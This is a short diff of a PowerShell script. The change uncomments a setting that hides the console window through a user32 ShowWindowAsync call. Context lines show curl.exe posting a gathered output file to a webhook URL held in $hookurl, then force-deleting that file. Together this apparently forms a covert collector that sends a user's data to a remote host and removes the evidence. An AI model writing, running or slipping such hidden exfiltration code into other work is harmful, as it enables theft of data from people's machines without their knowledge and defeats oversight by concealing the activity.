@@ -12,7 +12,7 @@ USAGE
 
 # Uncomment $hide='y' below to hide the console
 
-# $hide='y'
+$hide='y'
 if($hide -eq 'y'){
     $w=(Get-Process -PID $pid).MainWindowHandle
     $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
@@ -573,4 +573,5 @@ $resultLines = $infomessage1 -split "`n"
 curl.exe -F file1=@"$outpath" $hookurl
 Sleep 1
 Remove-Item -Path $outpath -force
+
 
